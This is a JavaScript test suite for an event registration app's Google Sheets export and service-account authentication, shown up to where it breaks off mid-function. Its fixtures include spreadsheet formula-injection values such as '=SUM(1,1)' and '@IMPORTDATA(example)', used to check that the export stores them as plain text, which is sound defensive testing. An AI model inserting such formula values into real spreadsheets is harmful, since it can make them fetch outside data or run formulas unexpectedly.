const assert = require("assert/strict");
const crypto = require("crypto");
const fs = require("fs");
const http = require("http");
const os = require("os");
const path = require("path");
const vm = require("vm");
const { once } = require("events");

const testDb = path.join(os.tmpdir(), `event-app-test-${process.pid}.json`);
process.env.EVENT_APP_DB_PATH = testDb;
process.env.EVENT_APP_ORGANIZER_KEY = "test-organizer-key";
process.env.NODE_ENV = "test";
delete process.env.EVENT_APP_SHEETS_EXPORT_URL;
delete process.env.EVENT_APP_SHEETS_EXPORT_KEY;
delete process.env.EVENT_APP_GOOGLE_SHEET_ID;
delete process.env.EVENT_APP_GOOGLE_SERVICE_ACCOUNT_JSON_BASE64;

const { server, startServer } = require("../server");
const { TRIVIA_QUESTIONS } = require("../trivia-questions");
const {
  TAB_HEADERS,
  buildExportSnapshot,
  createGoogleSheetsExporter,
  normalizedCell,
} = require("../google-sheets-export");
const {
  MANAGED_TAB_NAMES,
  buildAtomicSnapshotRequests,
  createGoogleSheetsServiceAccountSink,
  googleHttpError,
  parseServiceAccountConfiguration,
  serviceAccountJwt,
} = require("../google-sheets-service-account");
const EXPECTED_NEW_SONG_CHOICES = Object.freeze([
  "He Turned It",
  "Victory",
  "Brighter Day",
  "Praise - elevation worship",
  "I thank God - maverick city",
  "Amen- Madison Ryann Ward",
  "Quick - Caleb Gordon",
  "Goodbye Yesterday - elevation rhythm",
  "He called me",
  "247",
  "Elohim",
]);
const EXPECTED_SHEETS_TAB_HEADERS = Object.freeze({
  Attendees: Object.freeze([
    "attendeeId", "aliasIds", "name", "phone", "raffleNumber", "wristbandColor",
    "registeredAt", "wristbandConfirmedAt", "phase3CompletedAt", "completedBoothIds",
    "completedBoothCount", "signupOptionIds",
  ]),
  BoothResults: Object.freeze([
    "id", "attendeeId", "name", "phone", "raffleNumber", "wristbandColor", "boothId",
    "boothName", "checkedInBy", "checkedInAt", "sessionNumber", "runId", "runNumber",
    "score", "correctCount", "answeredCount", "totalQuestions", "votedFor",
    "featuredWinner", "extraData",
  ]),
  SignUps: Object.freeze([
    "id", "attendeeId", "name", "phone", "raffleNumber", "wristbandColor", "optionId",
    "optionTitle", "submittedAt", "confirmedInPerson", "confirmedBy", "confirmedAt",
  ]),
  TriviaAnswers: Object.freeze([
    "id", "attendeeId", "name", "raffleNumber", "wristbandColor", "sessionNumber",
    "runId", "runNumber", "questionId", "questionNumber", "answerIndex", "isCorrect",
    "answeredAt",
  ]),
  HeavenConfirmations: Object.freeze([
    "id", "attendeeId", "name", "raffleNumber", "wristbandColor", "sessionNumber",
    "runId", "runNumber", "action", "confirmedAt",
  ]),
  SongVotes: Object.freeze([
    "id", "attendeeId", "name", "raffleNumber", "wristbandColor", "sessionNumber",
    "runId", "runNumber", "songTitle", "votedAt", "updatedAt",
  ]),
  ExportMeta: Object.freeze(["key", "value"]),
});
const EXPECTED_SHEETS_STATUS_KEYS = Object.freeze([
  "configured", "lastAttemptAt", "lastError", "lastRowCounts", "lastSuccessAt",
  "nextRetryAt", "pending", "state", "syncing",
]);

function request(port, action, payload, method = "POST") {
  return new Promise((resolve, reject) => {
    const body = payload === undefined ? "" : JSON.stringify(payload);
    const req = http.request({
      hostname: "127.0.0.1",
      port,
      path: `/api/${action}`,
      method,
      headers: body ? {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(body),
      } : {},
    }, (res) => {
      let chunks = "";
      res.setEncoding("utf8");
      res.on("data", (chunk) => { chunks += chunk; });
      res.on("end", () => {
        let parsed = null;
        try { parsed = JSON.parse(chunks); }
        catch (e) { return reject(new Error(`Invalid JSON from ${action}: ${chunks}`)); }
        resolve({ status: res.statusCode, body: parsed });
      });
    });
    req.on("error", (error) => {
      error.message = `${action}: ${error.message}`;
      reject(error);
    });
    if (body) req.write(body);
    req.end();
  });
}

let generatedPhoneSuffix = 1000000;
function nextTestPhone() {
  generatedPhoneSuffix += 1;
  return `615${String(generatedPhoneSuffix).padStart(7, "0")}`;
}

async function registerPhoneAttendee(port, attendeeId, name, phone = nextTestPhone()) {
  const registration = await request(port, "registerAttendee", { attendeeId, name, phone });
  assert.equal(registration.status, 200, JSON.stringify(registration.body));
  return { ...registration.body, phone };
}

function rawRequest(port, action, body, headers = {}) {
  return new Promise((resolve, reject) => {
    const req = http.request({
      hostname: "127.0.0.1",
      port,
      path: `/api/${action}`,
      method: "POST",
      headers: Object.assign({ "Content-Length": Buffer.byteLength(body) }, headers),
    }, (res) => {
      let chunks = "";
      res.setEncoding("utf8");
      res.on("data", (chunk) => { chunks += chunk; });
      res.on("end", () => {
        let parsed = null;
        try { parsed = JSON.parse(chunks); }
        catch (error) { return reject(new Error(`Invalid raw JSON response: ${chunks}`)); }
        resolve({ status: res.statusCode, body: parsed });
      });
    });
    req.on("error", reject);
    req.write(body);
    req.end();
  });
}

function getPage(port, pathname) {
  return new Promise((resolve, reject) => {
    http.get({ hostname: "127.0.0.1", port, path: pathname }, (res) => {
      let body = "";
      res.setEncoding("utf8");
      res.on("data", (chunk) => { body += chunk; });
      res.on("end", () => resolve({ status: res.statusCode, body, headers: res.headers }));
    }).on("error", reject);
  });
}

function listHtmlFiles(directory) {
  return fs.readdirSync(directory, { withFileTypes: true }).flatMap((entry) => {
    const fullPath = path.join(directory, entry.name);
    return entry.isDirectory() ? listHtmlFiles(fullPath) : entry.name.endsWith(".html") ? [fullPath] : [];
  });
}

function assertIsoTimestamp(value, label = "timestamp") {
  assert.equal(typeof value, "string", `${label} should be a string`);
  assert.equal(Number.isNaN(Date.parse(value)), false, `${label} should be valid ISO time`);
}

function runInlineScriptSyntaxRegression() {
  const webRoot = path.join(__dirname, "..", "..", "web");
  listHtmlFiles(webRoot).forEach((filename) => {
    const source = fs.readFileSync(filename, "utf8");
    const inlineScript = /<script(?![^>]*\bsrc=)[^>]*>([\s\S]*?)<\/script>/gi;
    let match;
    while ((match = inlineScript.exec(source))) {
      new vm.Script(match[1], { filename });
    }
  });
}

function googleSheetsExportFixture() {
  return {
    dataResetAt: "2026-07-18T19:00:00.000Z",
    attendees: [
      {
        attendeeId: "attendee-formula",
        aliasIds: ["attendee-alias"],
        name: "=SUM(1,1)",
        phone: "6155550101",
        raffleNumber: "1001",
        wristbandColor: "blue",
        registeredAt: "2026-07-18T19:01:00.000Z",
        wristbandConfirmedAt: "2026-07-18T19:02:00.000Z",
        phase3CompletedAt: null,
        note: "This attendee-only note must not become a Sheet column.",
      },
      {
        attendeeId: "attendee-no-thanks",
        aliasIds: [],
        name: "No Thanks Guest",
        phone: "",
        raffleNumber: "1002",
        wristbandColor: "red",
        registeredAt: "2026-07-18T19:03:00.000Z",
        wristbandConfirmedAt: "2026-07-18T19:04:00.000Z",
        phase3CompletedAt: "2026-07-18T21:11:00.000Z",
      },
    ],
    boothCheckins: [
      {
        id: "checkin-1",
        attendeeId: "attendee-alias",
        name: "Stale alias name",
        phone: "6155550101",
        boothId: "trivia",
        boothName: "Bible Bowl",
        checkedInBy: "self",
        checkedInAt: "2026-07-18T20:29:00.000Z",
        rating: 5,
        note: "=private booth feedback",
        extraData: {
          sessionNumber: 1,
          runId: "trivia-session-1-run-2",
          runNumber: 2,
          score: 9,
          correctCount: 9,
          answeredCount: 10,
          totalQuestions: 15,
          votedFor: "Victory",
          featuredWinner: "Victory",
          promptShown: "A controlled booth prompt",
          reachedBeat: "closing",
          answers: { privateStoryAnswer: "Do not mirror this free text." },
          reflections: { privateArtReflection: "Do not mirror this either." },
        },
      },
    ],
    signups: [
      {
        id: "signup-1",
        attendeeId: "attendee-formula",
        name: "Stale signup name",
        phone: "6155550101",
        optionId: "future",
        optionTitle: "+Keep me posted",
        submittedAt: "2026-07-18T21:12:00.000Z",
        confirmedInPerson: true,
        confirmedBy: "staff",
        confirmedAt: "2026-07-18T21:13:00.000Z",
        stars: 5,
        comment: "Do not export this legacy feedback.",
      },
    ],
    triviaAnswers: [
      {
        id: "answer-1",
        attendeeId: "attendee-alias",
        sessionNumber: 1,
        runId: "trivia-session-1-run-2",
        runNumber: 2,
        questionId: "question-3",
        questionNumber: 3,
        answerIndex: 1,
        isCorrect: true,
        answeredAt: "2026-07-18T20:20:00.000Z",
      },
    ],
    heavenConfirmations: [
      {
        id: "heaven-confirmation-1",
        attendeeId: "attendee-no-thanks",
        sessionNumber: 2,
        runId: "heaven-session-2-run-1",
        runNumber: 1,
        action: "drawing_complete",
        confirmedAt: "2026-07-18T20:35:00.000Z",
      },
    ],
    songVotes: [
      {
        id: "song-vote-1",
        attendeeId: "attendee-formula",
        sessionNumber: 3,
        runId: "newsong-session-3-run-1",
        runNumber: 1,
        songTitle: "@Anthem",
        votedAt: "2026-07-18T20:55:00.000Z",
        updatedAt: "2026-07-18T20:55:00.000Z",
      },
    ],
  };
}

function sheetRowObject(snapshot, tabName, rowIndex = 0) {
  const selected = snapshot.tabs[tabName];
  return Object.fromEntries(selected.headers.map((header, index) => [header, selected.rows[rowIndex][index]]));
}

function sheetDataRowCounts(snapshot) {
  return Object.fromEntries(Object.entries(snapshot.tabs)
    .filter(([name]) => name !== "ExportMeta")
    .map(([name, selected]) => [name, selected.rows.length]));
}

async function runGoogleSheetsExporterRegression() {
  assert.deepEqual(TAB_HEADERS, EXPECTED_SHEETS_TAB_HEADERS);
  assert.deepEqual(Object.keys(TAB_HEADERS), [
    "Attendees", "BoothResults", "SignUps", "TriviaAnswers",
    "HeavenConfirmations", "SongVotes", "ExportMeta",
  ]);

  assert.equal(normalizedCell("=1+1"), "=1+1");
  assert.equal(normalizedCell(" +SUM(A1:A2)"), " +SUM(A1:A2)");
  assert.equal(normalizedCell("-2+3"), "-2+3");
  assert.equal(normalizedCell("@IMPORTDATA(example)"), "@IMPORTDATA(example)");
  assert.equal(normalizedCell("\tformula-shaped"), "\tformula-shaped");
  assert.equal(normalizedCell("ordinary text"), "ordinary text");
  assert.equal(normalizedCell(42), 42);

  const fixture = googleSheetsExportFixture();
  const generatedAt = "2026-07-18T22:00:00.000Z";
  const snapshot = buildExportSnapshot(fixture, { generatedAt });
  assert.equal(snapshot.generatedAt, generatedAt);
  assert.equal(snapshot.dataResetAt, fixture.dataResetAt);
  assert.deepEqual(Object.keys(snapshot.tabs), Object.keys(EXPECTED_SHEETS_TAB_HEADERS));
  Object.entries(EXPECTED_SHEETS_TAB_HEADERS).forEach(([name, headers]) => {
    assert.deepEqual(snapshot.tabs[name].headers, headers, `${name} headers should remain stable`);
  });

  const flattenedHeaders = Object.values(snapshot.tabs).flatMap((selected) => selected.headers);
  ["rating", "note", "stars", "comment"].forEach((feedbackField) => {
    assert.equal(flattenedHeaders.includes(feedbackField), false, `${feedbackField} must not be exported`);
  });

  const expectedCounts = {
    Attendees: 2,
    BoothResults: 1,
    SignUps: 1,
    TriviaAnswers: 0,
    HeavenConfirmations: 1,
    SongVotes: 0,
  };
  assert.deepEqual(sheetDataRowCounts(snapshot), expectedCounts);
  const repeatedSnapshot = buildExportSnapshot(JSON.parse(JSON.stringify(fixture)), {
    generatedAt: "2026-07-18T22:01:00.000Z",
  });
  assert.deepEqual(sheetDataRowCounts(repeatedSnapshot), expectedCounts);

  const formulaAttendee = sheetRowObject(snapshot, "Attendees", 0);
  assert.equal(formulaAttendee.attendeeId, "attendee-formula");
  assert.equal(formulaAttendee.aliasIds, '["attendee-alias"]');
  assert.equal(formulaAttendee.name, "=SUM(1,1)");
  assert.equal(formulaAttendee.phone, "(615) 555-0101");
  assert.equal(formulaAttendee.completedBoothIds, '["trivia"]');
  assert.equal(formulaAttendee.completedBoothCount, 1);
  assert.equal(formulaAttendee.signupOptionIds, '["future"]');

  const noThanksAttendee = sheetRowObject(snapshot, "Attendees", 1);
  assert.equal(noThanksAttendee.phase3CompletedAt, "2026-07-18T21:11:00.000Z");
  assert.equal(noThanksAttendee.signupOptionIds, "[]");
  assert.equal(noThanksAttendee.completedBoothCount, 0);
  assert.equal(snapshot.tabs.SignUps.rows.length, 1, "No-thanks completion must not create a SignUps row");

  const boothResult = sheetRowObject(snapshot, "BoothResults");
  assert.equal(boothResult.attendeeId, "attendee-formula", "alias check-in should map to its canonical attendee");
  assert.equal(boothResult.name, "=SUM(1,1)");
  assert.equal(boothResult.phone, "(615) 555-0101");
  assert.equal(boothResult.raffleNumber, "1001");
  assert.equal(boothResult.wristbandColor, "blue");
  assert.equal(boothResult.sessionNumber, 1);
  assert.equal(boothResult.runId, "trivia-session-1-run-2");
  assert.equal(boothResult.score, "");
  assert.equal(boothResult.correctCount, "");
  assert.equal(boothResult.answeredCount, "");
  assert.equal(boothResult.totalQuestions, "");
  assert.equal(boothResult.votedFor, "");
  assert.equal(boothResult.featuredWinner, "");
  const boothMetadata = JSON.parse(boothResult.extraData);
  ["score", "correctCount", "answeredCount", "totalQuestions", "votedFor", "featuredWinner"].forEach((field) => {
    assert.equal(field in boothMetadata, false, `${field} must remain booth-only`);
  });
  assert.equal(boothResult.extraData.includes("private booth feedback"), false);
  assert.equal(boothResult.extraData.includes("privateStoryAnswer"), false);
  assert.equal(boothResult.extraData.includes("privateArtReflection"), false);

  const signup = sheetRowObject(snapshot, "SignUps");
  assert.equal(signup.name, "=SUM(1,1)");
  assert.equal(signup.phone, "(615) 555-0101");
  assert.equal(signup.raffleNumber, "1001");
  assert.equal(signup.optionTitle, "+Keep me posted");
  assert.equal(signup.confirmedInPerson, true);

  assert.equal(snapshot.tabs.TriviaAnswers.rows.length, 0);

  const heavenConfirmation = sheetRowObject(snapshot, "HeavenConfirmations");
  assert.equal(heavenConfirmation.attendeeId, "attendee-no-thanks");
  assert.equal(heavenConfirmation.name, "No Thanks Guest");
  assert.equal(heavenConfirmation.action, "drawing_complete");

  assert.equal(snapshot.tabs.SongVotes.rows.length, 0);

  const legacyPhoneSnapshot = buildExportSnapshot({
    attendees: [{
      attendeeId: "legacy-phone-attendee",
      aliasIds: [],
      name: "Legacy Phone Guest",
      phone: "16155550102",
      raffleNumber: "1099",
    }],
    boothCheckins: [{
      id: "legacy-phone-checkin",
      attendeeId: "legacy-phone-attendee",
      phone: "16155550102",
      boothId: "story",
      boothName: "The Heaven Booth",
    }],
    signups: [{
      id: "legacy-phone-signup",
      attendeeId: "legacy-phone-attendee",
      phone: "16155550102",
      optionId: "future",
      optionTitle: "Keep me posted on future events",
    }],
  }, { generatedAt });
  assert.equal(sheetRowObject(legacyPhoneSnapshot, "Attendees").phone, "+1 (615) 555-0102");
  assert.equal(sheetRowObject(legacyPhoneSnapshot, "BoothResults").phone, "+1 (615) 555-0102");
  assert.equal(sheetRowObject(legacyPhoneSnapshot, "SignUps").phone, "+1 (615) 555-0102");
  assert.equal(legacyPhoneSnapshot.tabs.TriviaAnswers.headers.includes("phone"), false);
  assert.equal(legacyPhoneSnapshot.tabs.HeavenConfirmations.headers.includes("phone"), false);
  assert.equal(legacyPhoneSnapshot.tabs.SongVotes.headers.includes("phone"), false);

  const exportMeta = Object.fromEntries(snapshot.tabs.ExportMeta.rows);
  assert.equal(exportMeta.schemaVersion, 1);
  assert.equal(exportMeta.generatedAt, generatedAt);
  assert.equal(exportMeta.dataResetAt, fixture.dataResetAt);
  Object.entries(expectedCounts).forEach(([name, count]) => {
    assert.equal(exportMeta[`${name}.rowCount`], count);
  });

  // A shared household number must never make one attendee inherit another
  // person's booth completion or Phase 3 selection in the live Sheet.
  const householdSnapshot = buildExportSnapshot({
    attendees: [
      { attendeeId: "house-a", aliasIds: [], name: "Alex One", phone: "6155550199", raffleNumber: "2001" },
      { attendeeId: "house-b", aliasIds: [], name: "Alex Two", phone: "6155550199", raffleNumber: "2002" },
    ],
    boothCheckins: [
      { id: "house-checkin-a", attendeeId: "house-a", name: "Alex One", phone: "6155550199", boothId: "trivia" },
      { id: "house-checkin-b", attendeeId: "house-b", name: "Alex Two", phone: "6155550199", boothId: "art" },
    ],
    signups: [
      { id: "house-signup-a", attendeeId: "house-a", name: "Alex One", phone: "6155550199", optionId: "future" },
      { id: "house-signup-b", attendeeId: "house-b", name: "Alex Two", phone: "6155550199", optionId: "course" },
    ],
  }, { generatedAt });
  const householdAttendees = householdSnapshot.tabs.Attendees.rows.map((_, index) => (
    sheetRowObject(householdSnapshot, "Attendees", index)
  ));
  assert.deepEqual(
    householdAttendees.map((row) => [row.attendeeId, row.completedBoothIds, row.signupOptionIds]),
    [
      ["house-a", '["trivia"]', '["future"]'],
      ["house-b", '["art"]', '["course"]'],
    ]
  );
  assert.deepEqual(
    householdSnapshot.tabs.BoothResults.rows.map((_, index) => {
      const row = sheetRowObject(householdSnapshot, "BoothResults", index);
      return [row.attendeeId, row.name, row.raffleNumber];
    }),
    [["house-a", "Alex One", "2001"], ["house-b", "Alex Two", "2002"]]
  );

  const emptyConfiguration = parseServiceAccountConfiguration({});
  assert.equal(emptyConfiguration.configured, false);
  assert.equal(emptyConfiguration.configurationError, null);
  const legacyOnlyConfiguration = parseServiceAccountConfiguration({
    EVENT_APP_SHEETS_EXPORT_URL: "https://script.google.com/macros/s/legacy/exec",
    EVENT_APP_SHEETS_EXPORT_KEY: "retired-export-key",
  });
  assert.equal(legacyOnlyConfiguration.configured, false);
  assert.match(legacyOnlyConfiguration.configurationError, /no longer used/i);
  const partialConfiguration = parseServiceAccountConfiguration({
    EVENT_APP_GOOGLE_SHEET_ID: "test-spreadsheet-id-1234567890",
  });
  assert.equal(partialConfiguration.configured, false);
  assert.match(partialConfiguration.configurationError, /both .* are required/i);
  const invalidCredentialConfiguration = parseServiceAccountConfiguration({
    EVENT_APP_GOOGLE_SHEET_ID: "test-spreadsheet-id-1234567890",
    EVENT_APP_GOOGLE_SERVICE_ACCOUNT_JSON_BASE64: "not base64!",
  });
  assert.equal(invalidCredentialConfiguration.configured, false);
  assert.match(invalidCredentialConfiguration.configurationError, /not valid base64/i);

  const testKeyPair = crypto.generateKeyPairSync("rsa", {
    modulusLength: 1024,
    publicKeyEncoding: { type: "spki", format: "pem" },
    privateKeyEncoding: { type: "pkcs8", format: "pem" },
  });
  const spreadsheetId = "test-spreadsheet-id-1234567890";
  const clientEmail = "event-app-test@test-project.iam.gserviceaccount.com";
  const encodedCredentials = Buffer.from(JSON.stringify({
    type: "service_account",
    project_id: "test-project",
    private_key_id: "unit-test-key-id",
    private_key: testKeyPair.privateKey,
    client_email: clientEmail,
  })).toString("base64");
  const serviceAccountEnv = {
    EVENT_APP_GOOGLE_SHEET_ID: spreadsheetId,
    EVENT_APP_GOOGLE_SERVICE_ACCOUNT_JSON_BASE64: encodedCredentials,
  };
  const validConfiguration = parseServiceAccountConfiguration(serviceAccountEnv);
  assert.equal(validConfiguration.configured, true);
  assert.equal(validConfiguration.configurationError, null);
  assert.equal(validConfiguration.spreadsheetId, spreadsheetId);
  assert.equal(validConfiguration.clientEmail, clientEmail);

  const jwtNowMs = Date.parse("2026-07-18T22:00:00.000Z");
  const jwt = serviceAccountJwt(validConfiguration, jwtNowMs);
  const jwtParts = jwt.split(".");
  assert.equal(jwtParts.length, 3);
  const decodeJwtPart = (part) => JSON.parse(Buffer.from(
    part.replace(/-/g, "+").replace(/_/g, "/"),
    "base64"
  ).toString("utf8"));
  assert.deepEqual(decodeJwtPart(jwtParts[0]), {
    alg: "RS256",
    typ: "JWT",
    kid: "unit-test-key-id",
  });
  const jwtClaims = decodeJwtPart(jwtParts[1]);
  assert.equal(jwtClaims.iss, clientEmail);
  assert.equal(jwtClaims.scope, "https://www.googleapis.com/auth/spreadsheets");
  assert.equal(jwtClaims.aud, "https://oauth2.googleapis.com/token");
  assert.equal(jwtClaims.iat, Math.floor(jwtNowMs / 1000));
  assert.equal(jwtClaims.exp, jwtClaims.iat + 3600);
  assert.equal(crypto.verify(
    "RSA-SHA256",
    Buffer.from(`${jwtParts[0]}.${jwtParts[1]}`),
    testKeyPair.publicKey,
    Buffer.from(jwtParts[2].replace(/-/g, "+").replace(/_/g, "/"), "base64")
  ), true);

  const metadata = {
    sheets: [
      ...MANAGED_TAB_NAMES.slice(0, -1).map((name, index) => ({
        properties: {
          sheetId: 100 + index,
          title: `Live_${name}`,
          gridProperties: {
            rowCount: name === "Attendees" ? 1 : 50,
            columnCount: name === "Attendees" ? 1 : 30,
            frozenRowCount: name === "Attendees" ? 0 : 1,
          },
        },
      })),
      {
        properties: {
          sheetId: 999,
          title: "Notes",
          gridProperties: { rowCount: 100, columnCount: 20, frozenRowCount: 0 },
        },
      },
    ],
  };
  const atomicRequests = buildAtomicSnapshotRequests(snapshot, metadata);
  const exportMetaAdd = atomicRequests.find((entry) => (
    entry.addSheet && entry.addSheet.properties.title === "Live_ExportMeta"
  ));
  assert.ok(exportMetaAdd, "missing managed tabs should be created in the atomic batch");
  assert.equal(Number.isInteger(exportMetaAdd.addSheet.properties.sheetId), true);
  const attendeeResize = atomicRequests.find((entry) => (
    entry.updateSheetProperties && entry.updateSheetProperties.properties.sheetId === 100
  ));
  assert.ok(attendeeResize, "undersized managed tabs should grow before their values are replaced");
  assert.equal(attendeeResize.updateSheetProperties.properties.gridProperties.rowCount >= 3, true);
  assert.equal(attendeeResize.updateSheetProperties.properties.gridProperties.columnCount, TAB_HEADERS.Attendees.length);
  const atomicCellUpdates = atomicRequests.filter((entry) => entry.updateCells);
  assert.equal(atomicCellUpdates.length, MANAGED_TAB_NAMES.length);
  assert.equal(
    atomicCellUpdates[atomicCellUpdates.length - 1].updateCells.range.sheetId,
    exportMetaAdd.addSheet.properties.sheetId,
    "ExportMeta should remain the final managed tab in the atomic replacement"
  );
  const boothUpdate = atomicCellUpdates.find((entry) => entry.updateCells.range.sheetId === 101);
  assert.equal(boothUpdate.updateCells.range.endRowIndex, 50, "stale tail rows must be covered and cleared");
  assert.equal(boothUpdate.updateCells.range.endColumnIndex, 30, "stale extra columns must be covered and cleared");
  const attendeeUpdate = atomicCellUpdates.find((entry) => entry.updateCells.range.sheetId === 100);
  const formulaNameCell = attendeeUpdate.updateCells.rows[1].values[TAB_HEADERS.Attendees.indexOf("name")];
  assert.equal(formulaNameCell.userEnteredValue.stringValue, "=SUM(1,1)");
  assert.equal("formulaValue" in formulaNameCell.userEnteredValue, false);
  assert.equal(JSON.stringify(atomicRequests).includes('"sheetId":999'), false, "unmanaged tabs must not be changed");

  const firstSyncRequests = buildAtomicSnapshotRequests(
    buildExportSnapshot({}, { generatedAt: "2026-07-18T21:59:59.000Z" }),
    { sheets: [] }
  );
  const emptyAttendeesAdd = firstSyncRequests.find((entry) => (
    entry.addSheet && entry.addSheet.properties.title === "Live_Attendees"
  ));
  assert.equal(emptyAttendeesAdd.addSheet.properties.gridProperties.rowCount, 2);
  assert.equal(emptyAttendeesAdd.addSheet.properties.gridProperties.frozenRowCount, 1);
  const emptyAttendeesUpdate = firstSyncRequests.find((entry) => (
    entry.updateCells
      && entry.updateCells.range.sheetId === emptyAttendeesAdd.addSheet.properties.sheetId
  ));
  assert.equal(emptyAttendeesUpdate.updateCells.rows.length, 1);
  assert.equal(emptyAttendeesUpdate.updateCells.range.endRowIndex, 2);

  const detailedBadRequest = googleHttpError(
    400,
    "sheets.googleapis.com",
    JSON.stringify({
      error: {
        code: 400,
        message: "Invalid requests[0].addSheet: You can't freeze all rows on a sheet.\n",
        status: "INVALID_ARGUMENT",
      },
    })
  );
  assert.equal(detailedBadRequest.statusCode, 400);
  assert.equal(
    detailedBadRequest.message,
    "Google Sheets rejected the update (HTTP 400): Invalid requests[0].addSheet: You can't freeze all rows on a sheet."
  );
  assert.equal(
    googleHttpError(400, "oauth2.googleapis.com", JSON.stringify({
      error: { message: "do-not-display-oauth-details" },
    })).message,
    "Google service-account authentication failed. Check the JSON key and redeploy Render."
  );

  assert.throws(
    () => buildAtomicSnapshotRequests(snapshot, {
      sheets: [{
        properties: {
          sheetId: 777,
          title: "Live_Attendees",
          sheetType: "OBJECT",
        },
      }],
    }),
    /Live_Attendees must be a standard grid sheet/
  );

  const fullMetadata = {
    sheets: MANAGED_TAB_NAMES.map((name, index) => ({
      properties: {
        sheetId: 200 + index,
        title: `Live_${name}`,
        gridProperties: { rowCount: 50, columnCount: 30, frozenRowCount: 1 },
      },
    })),
  };
  let tokenCalls = 0;
  const serviceAccountCalls = [];
  const directSink = createGoogleSheetsServiceAccountSink({
    env: serviceAccountEnv,
    now: () => jwtNowMs,
    requestJson: async (url, options = {}) => {
      serviceAccountCalls.push({ url, options });
      if (url === "https://oauth2.googleapis.com/token") {
        tokenCalls += 1;
        assert.equal(options.method, "POST");
        const tokenForm = new URLSearchParams(options.body);
        assert.equal(tokenForm.get("grant_type"), "urn:ietf:params:oauth:grant-type:jwt-bearer");
        assert.equal(tokenForm.get("assertion").split(".").length, 3);
        return { access_token: "unit-test-access-token", expires_in: 3600 };
      }
      assert.equal(options.headers.Authorization, "Bearer unit-test-access-token");
      if (options.method === "GET") return fullMetadata;
      if (url.endsWith(":batchUpdate")) return { replies: [] };
      throw new Error(`Unexpected Google API test call: ${url}`);
    },
  });
  assert.equal(directSink.configured, true);
  await directSink.writeSnapshot(snapshot);
  const emptySnapshot = buildExportSnapshot(
    { dataResetAt: "2026-07-18T23:00:00.000Z" },
    { generatedAt: "2026-07-18T23:00:01.000Z" }
  );
  await directSink.writeSnapshot(emptySnapshot);
  assert.equal(tokenCalls, 1, "the service-account token should be reused until its refresh window");
  const directBatches = serviceAccountCalls.filter((call) => call.url.endsWith(":batchUpdate"));
  const metadataCalls = serviceAccountCalls.filter((call) => call.options.method === "GET");
  assert.equal(metadataCalls.length, 2);
  assert.equal(metadataCalls.every((call) => call.url.includes("sheetType")), true);
  assert.equal(directBatches.length, 2);
  directBatches.forEach((call) => {
    assert.equal(call.options.method, "POST");
    assert.equal(call.options.body.requests.filter((entry) => entry.updateCells).length, 7);
  });
  const resetCellUpdates = directBatches[1].options.body.requests.filter((entry) => entry.updateCells);
  resetCellUpdates.slice(0, -1).forEach((entry) => {
    assert.equal(entry.updateCells.rows.length, 1, "a reset sync should leave only each data tab header");
    assert.equal(entry.updateCells.range.endRowIndex, 50, "a reset sync should clear prior data rows");
  });
  assert.equal(resetCellUpdates[resetCellUpdates.length - 1].updateCells.rows.length > 1, true);

  let authorizationTokenCalls = 0;
  let rejectedFirstToken = false;
  const authorizationRetrySink = createGoogleSheetsServiceAccountSink({
    env: serviceAccountEnv,
    now: () => jwtNowMs,
    requestJson: async (url, options = {}) => {
      if (url === "https://oauth2.googleapis.com/token") {
        authorizationTokenCalls += 1;
        return { access_token: `authorization-token-${authorizationTokenCalls}`, expires_in: 3600 };
      }
      if (
        options.method === "GET"
        && options.headers.Authorization === "Bearer authorization-token-1"
        && !rejectedFirstToken
      ) {
        rejectedFirstToken = true;
        const error = new Error("expired unit-test token");
        error.statusCode = 401;
        throw error;
      }
      if (options.method === "GET") return fullMetadata;
      return { replies: [] };
    },
  });
  await authorizationRetrySink.writeSnapshot(snapshot);
  assert.equal(authorizationTokenCalls, 2, "one 401 should invalidate the cached token and retry once");

  let disabledSendCount = 0;
  const disabledExporter = createGoogleSheetsExporter({
    getSnapshot: googleSheetsExportFixture,
    env: {},
    requestJson: async () => { disabledSendCount += 1; },
  });
  assert.equal(disabledExporter.configured(), false);
  disabledExporter.markDirty();
  disabledExporter.queueImmediate();
  const disabledStatus = await disabledExporter.flush();
  assert.equal(disabledSendCount, 0, "disabled export must never invoke the injected sender");
  assert.deepEqual(Object.keys(disabledStatus).sort(), EXPECTED_SHEETS_STATUS_KEYS);
  assert.deepEqual(disabledStatus, {
    configured: false,
    state: "disabled",
    pending: false,
    syncing: false,
    lastAttemptAt: null,
    lastSuccessAt: null,
    lastError: null,
    lastRowCounts: null,
    nextRetryAt: null,
  });

  const successfulCalls = [];
  const successfulExporter = createGoogleSheetsExporter({
    getSnapshot: googleSheetsExportFixture,
    env: { EVENT_APP_SHEETS_EXPORT_DEBOUNCE_MS: "60000" },
    sheetsWriter: {
      configured: true,
      configurationError: null,
      redactedValues: [],
      writeSnapshot: async (exportedSnapshot) => { successfulCalls.push(exportedSnapshot); },
    },
  });
  successfulExporter.markDirty();
  assert.equal(successfulExporter.status().state, "pending");
  const successfulStatus = await successfulExporter.flush();
  assert.equal(successfulCalls.length, 1);
  assert.deepEqual(sheetDataRowCounts(successfulCalls[0]), expectedCounts);
  assert.equal(successfulStatus.state, "idle");
  assert.equal(successfulStatus.lastError, null);
  assert.deepEqual(successfulStatus.lastRowCounts, expectedCounts);
  assertIsoTimestamp(successfulStatus.lastAttemptAt, "export lastAttemptAt");
  assertIsoTimestamp(successfulStatus.lastSuccessAt, "export lastSuccessAt");

  let retryAttempts = 0;
  const spreadsheetSecret = "retry-sheet-id-123456789012345";
  const credentialSecret = "retry-service-account-credential";
  const emailSecret = "retry@test-project.iam.gserviceaccount.com";
  const loggedErrors = [];
  const retryingExporter = createGoogleSheetsExporter({
    getSnapshot: googleSheetsExportFixture,
    env: { EVENT_APP_SHEETS_EXPORT_DEBOUNCE_MS: "60000" },
    logger: { error: (message) => loggedErrors.push(message) },
    sheetsWriter: {
      configured: true,
      configurationError: null,
      redactedValues: [spreadsheetSecret, credentialSecret, emailSecret],
      writeSnapshot: async () => {
        retryAttempts += 1;
        if (retryAttempts === 1) {
          throw new Error(`Failed sending ${credentialSecret} to ${spreadsheetSecret} for ${emailSecret}.`);
        }
      },
    },
  });
  retryingExporter.markDirty();
  const failedStatus = await retryingExporter.flush();
  assert.equal(retryAttempts, 1);
  assert.equal(failedStatus.state, "error");
  assert.equal(failedStatus.pending, true);
  assertIsoTimestamp(failedStatus.nextRetryAt, "export nextRetryAt");
  assert.equal(failedStatus.lastError.includes("[redacted]"), true);
  [spreadsheetSecret, credentialSecret, emailSecret].forEach((secretValue) => {
    assert.equal(failedStatus.lastError.includes(secretValue), false);
    assert.equal(loggedErrors.some((message) => message.includes(secretValue)), false);
  });
